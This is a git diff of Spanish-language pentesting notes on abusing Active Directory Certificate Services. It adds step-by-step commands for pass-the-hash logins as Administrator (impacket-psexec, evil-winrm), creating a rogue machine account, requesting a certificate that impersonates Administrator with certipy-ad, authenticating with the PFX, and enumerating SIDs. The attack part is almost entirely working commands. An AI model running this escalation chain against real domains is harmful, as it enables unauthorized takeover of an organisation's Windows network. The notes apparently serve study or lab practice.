@@ -13,7 +13,8 @@ Utilidades practicas:
 	- Acceder a redes VPN
 
 Componentes:
-- CA (Autoridad Certificadora)
+- CA (Autoridad Certificadora) 
+- BUILTIN\Certificate Service DCOM Access
 - Certificate Templates 
 	- Quien emite el certificado
 	- Duración 
@@ -55,6 +56,7 @@ Paso 2:
 
 Paso 3:
 # Conectarse al server como Administrator 
+❯ impacket-psexec administrator@<IP> -hashes :NThash
 ❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
 
 
@@ -103,6 +105,11 @@ Paso 2:
 	# computer-name = Nombre del objeto computador a crear
 	# computer-pass = Contraseña del objeto computador 
 
+# Si muestra el siguiente error: [-] rpc_s_access_denied, se soluciona con el siguiente comando: 
+❯ impacket-addcomputer domain.corp/user:'P@$$w0rd123!' -dc-ip IP_DC -computer-name 'Computer1' -computer-pass 'C0mput3r123!' -method LDAPS
+	# -method LDAP   # Otra alternativa 
+
+
 NOTA:
 	- El comando agregará el símbolo '$' al final y quedará: 'Computer1$'
 ```
@@ -114,18 +121,25 @@ Paso 3:
 ❯ certipy-ad req -u 'Computer1$' -p 'C0mput3r123!' -dc-ip IP_DC -ca CA_NAME -template 'Template_Name' -upn 'Administrator@domain.corp' -sid <Target_User_SID>
 
 	# upn = Usuario a impersonar 
-	# sid = Requerido si hay un SID mismatch error (SID Del usuario a impersonar 'Administraator')
+	# sid = Requerido si hay un SID mismatch error (SID Del usuario a impersonar 'Administrator')
 	# Ejemplo del SID:
 		S-1-5-21-1496966362-3320961333-4044918980-500
 		
 	# -dns (OPCIONAL) = Es la IP del DC 
 	# -target (OPCIONAL) = Es el dominio 
+
+
+TIP: Para obtener los SID
+	- Se puede ver en BloodHound 'Object ID'
+	- Con el siguiente comandos:
+# Filtrar por usuarios en específico para obtener los RIDs
+❯ impacket-lookupsid domain.local/user:'P@$$w0rd123!'@IP_DC | grep -i "bradley\|beverly\|bernard" 
 ```
 
 ```bash 
 Paso 4:
 # Autenticación vía PFX
-❯ certipy-ad auth -pfx 'Administrator.pfx' -dc-ip IP_DC
+❯ certipy-ad auth -pfx 'administrator.pfx' -dc-ip IP_DC
 ```
 
 ```bash
@@ -137,7 +151,7 @@ Paso 5:
  
 Paso 6:
 # Conectarse al server 
-❯ impacket-smbexec 'Administrator'@<IP> -hashes LM:NT
+❯ impacket-psexec administrator@<IP> -hashes :NThash
 ❯ evil-winrm -i IP_DC -u Administrator 
 
 
